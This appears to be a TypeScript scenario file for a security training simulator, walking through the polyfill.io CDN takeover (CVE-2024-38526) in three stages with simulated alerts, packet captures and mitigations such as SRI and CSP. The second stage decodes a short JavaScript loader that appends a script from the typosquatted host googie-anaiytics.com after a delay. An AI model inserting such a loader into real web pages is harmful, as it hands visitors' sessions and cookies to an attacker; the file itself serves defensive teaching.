import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'polyfill-io-cdn-domain-supply-chain',
    title: 'cdn.polyfill.io CDN Domain Takeover & Conditional JS Injection (CVE-2024-38526)',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.002',
    description:
      'Following the acquisition of the polyfill.io domain (embedded across 100,000+ websites without Subresource Integrity), the new operator modifies the CDN edge servers to dynamically inject obfuscated JavaScript into mobile visitors while returning clean polyfills to desktop admins and crawlers.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Rogue CDN Operator (cdn.polyfill.io)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Enterprise Web Portal (<script src=...)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'End-User Mobile Browser Session', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'Sansec Scanner / Cloudflare Page Shield', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'DOM Session Context & Redirect Target', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Unpinned Third-Party <script> Tag Without Subresource Integrity (SRI)',
        narration:
          'Over 100,000 production web applications include <script src="https://cdn.polyfill.io/v2/polyfill.min.js"></script> without an integrity="sha384-..." attribute, delegating full DOM execution trust to the external domain owner.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.002 - Compromise Software Supply Chain)',
        technicalCommands: [
          '<script src="https://cdn.polyfill.io/v2/polyfill.min.js"></script> (Missing integrity & crossorigin attributes)',
        ],
        defenseMitigation:
          'Eliminate external polyfill CDNs or enforce Subresource Integrity (SRI) hashes (`integrity="sha384-..."`) and strict Content-Security-Policy (`script-src`) directives.',
        logs: [
          {
            id: 'poly-1',
            timestamp: '09:10:12.004',
            source: 'WAF',
            severity: 'warning',
            raw: 'Page Shield Inventory Alert | ScriptURL: https://cdn.polyfill.io/v2/polyfill.min.js | SubresourceIntegrity: MISSING | DomainOwnershipStatus: Transferred to Funnull (CVE-2024-38526)',
            parsedFields: {
              ExternalScriptUrl: 'https://cdn.polyfill.io/v2/polyfill.min.js',
              SriStatus: 'Missing integrity attribute',
              CveId: 'CVE-2024-38526',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: HTTP User-Agent Fingerprinting & Evasive Payload Generation',
        narration:
          'When a client browser requests polyfill.min.js, the rogue CDN edge server inspects the HTTP User-Agent, Referer, and time-of-day, serving clean code to desktop browsers and web crawlers while appending heavily obfuscated JavaScript to mobile User-Agents.',
        activeNodes: ['attacker', 'target', 'siem'],
        mitreTactic: 'Defense Evasion (T1027 - Obfuscated Files or Information)',
        technicalCommands: [
          'GET /v2/polyfill.min.js HTTP/2 | User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X)',
          'CDN Conditional Injection: Checks !window.google_analytics_admin && delayed setTimeout(eval(...), 15000)',
        ],
        defenseMitigation:
          'Enable Cloudflare automatic polyfill.io URL rewriting (redirecting to cdnjs.cloudflare.com/polyfill) and monitor client-side CSP violation reports.',
        logs: [
          {
            id: 'poly-2',
            timestamp: '09:10:14.330',
            source: 'WAF',
            severity: 'critical',
            raw: 'Sansec Client-Side Script Integrity Alert | Source: https://cdn.polyfill.io/v2/polyfill.min.js | UserAgent: iPhone OS 17_5 | PayloadDiff: Appended obfuscated closure injecting https://www.googie-anaiytics.com/gtags.js',
            parsedFields: {
              TargetCondition: 'Mobile User-Agent + Non-Admin Session',
              InjectedDomain: 'www.googie-anaiytics.com (Typosquatted Loader)',
              EvasionTechnique: '15-second delayed execution + crawler User-Agent bypass',
            },
          },
        ],
        packets: [
          {
            id: 'poly-pkt-1',
            timestamp: '09:10:14.310',
            protocol: 'HTTPS',
            sourceIp: '104.244.43.12',
            destIp: '172.16.80.19',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 1420,
            hexDump: '2F 2A 20 50 6F 6C 79 66 69 6C 6C 20 73 65 72 76 69 63 65 20 76 33 2E 31 31 30 2E 31 20 2A 2F 28 66 75 6E 63 74 69 6F 6E 28 77 2C 64 29 7B',
            decodedString: '/* Polyfill service v3.110.1 */ (function(w,d){setTimeout(function(){var s=d.createElement("script");s.src="https://www.googie-anaiytics.com/gtags.js";d.head.appendChild(s)},15000)})(window,document);',
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: First-Party DOM Execution & Silent Session Hijack / Redirection',
        narration:
          'Executing inside the host website’s first-party origin, the injected script has unrestricted access to document.cookie, localStorage, and the DOM, loading secondary scripts from www.googie-anaiytics.com and hijacking user navigation.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Collection & Impact (T1185 - Browser Session Hijacking)',
        technicalCommands: [
          'DOM Execution in First-Party Origin: Access to document.cookie, window.localStorage, and location.replace()',
        ],
        defenseMitigation:
          'Deploy Content-Security-Policy (CSP) with strict-dynamic or explicit script hashes and place compromised third-party domains on registrar clientHold.',
        logs: [
          {
            id: 'poly-3',
            timestamp: '09:10:29.501',
            source: 'WAF',
            severity: 'critical',
            raw: 'CSP Report-Only Violation | BlockedURI: https://www.googie-anaiytics.com/gtags.js | DocumentURI: https://checkout.enterprise.example.com/ | ViolatedDirective: script-src-elem',
            parsedFields: {
              HostOrigin: 'https://checkout.enterprise.example.com',
              SecondaryPayloadUri: 'https://www.googie-anaiytics.com/gtags.js',
              SecurityImpact: 'Full First-Party DOM & Storage Access',
            },
          },
        ],
        packets: [],
      },
    ],
  };
